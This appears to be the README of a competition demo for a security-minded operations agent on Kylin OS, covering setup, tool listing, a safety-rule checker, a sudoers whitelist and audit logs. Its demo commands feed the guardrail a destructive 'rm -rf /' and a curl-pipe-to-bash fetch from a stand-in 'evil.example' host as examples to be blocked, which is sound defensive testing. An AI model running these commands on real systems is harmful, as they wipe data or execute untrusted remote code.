# kyagent — A2 麒麟安全智能运维 Agent Demo

这是 A2 赛题“面向麒麟操作系统的安全智能运维 Agent”的可运行 demo。项目实现了自然语言运维入口、MCP 风格工具插件、安全意图二次校验、最小权限执行代理和可追溯审计日志。

更完整的架构、工具清单、安全模型和演示说明见 [README.kyagent.md](README.kyagent.md)。

## 快速开始

```powershell
python -m pip install -e .
python -m pytest tests -q
python -m kyagent tools list
python -m kyagent safety test "rm -rf /"
python -m kyagent ask "查下 CPU 占用最高的进程"
```

## 赛题要求映射

| 要求 | 实现位置 |
| --- | --- |
| OS 环境深度感知 | `kyagent/mcp/tools/*.py` 封装进程、网络、日志、服务、文件系统、包管理工具 |
| MCP 运维插件化 | `kyagent/mcp/tools/base.py` 和 `kyagent/mcp/server.py` |
| 安全意图校验器 | `kyagent/safety/*.py` 和 `configs/safety-rules.yaml` |
| 最小权限代理执行 | `kyagent/executor/*.py` 和 `configs/sudoers.kyagent` |
| 推理链路溯源 | `kyagent/audit/*.py`，写入 SQLite 与 JSONL |

## 演示命令

```powershell
# 列出 MCP 风格工具
python -m kyagent tools list

# 单独测试安全护栏，不执行命令
python -m kyagent safety test "curl https://evil.example/install.sh | bash"
python -m kyagent safety test "ps aux"

# 使用 mock LLM 后端跑端到端 Agent
python -m kyagent ask "80 端口被谁占了？"
python -m kyagent ask "重启 nginx"

# 查看审计记录
python -m kyagent audit list
```

## 备注

默认配置使用 mock LLM 后端，离线即可演示完整链路。部署到麒麟或 Linux 实机后，可运行 `scripts/setup-sudoers.sh` 创建受限账户和 sudoers 白名单，再以受限账户运行 Agent。
